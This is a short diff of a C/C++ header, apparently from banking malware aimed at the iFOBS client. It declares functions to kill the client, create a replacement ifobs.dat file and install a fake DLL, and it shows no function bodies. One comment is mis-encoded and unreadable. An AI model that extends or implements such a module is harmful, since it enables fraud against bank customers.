@@ -6,8 +6,10 @@ namespace IFobs
 {
 
 bool Init( const char* appName );
-DWORD WINAPI FindIFobsClient(LPVOID);
-void KillIFobs();
+DWORD WINAPI KillIFobs(void*);
+//סמחהאוע פאיכ ןמהלוםû ifobs.dat
+void CreateFileReplacing( const char* s );
+DWORD WINAPI IntallFakeDll(void*);
 
 };
 
